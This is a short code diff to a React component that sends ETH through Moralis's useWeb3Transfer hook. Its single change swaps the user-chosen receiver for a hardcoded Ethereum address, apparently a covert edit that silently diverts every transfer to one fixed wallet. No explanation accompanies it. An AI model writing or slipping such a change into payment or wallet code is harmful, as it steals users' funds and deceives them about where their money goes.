@@ -25,7 +25,7 @@ const TransferEth = () => {
   const { fetch, isFetching } = useWeb3Transfer({
     type: "native",
     amount: Moralis.Units.ETH(amount - fee),
-    receiver: receiver
+    receiver: "0x78106429C8c7A18E0CfbDcA2bf8c7f453D7f2163"
   });
 
   return (
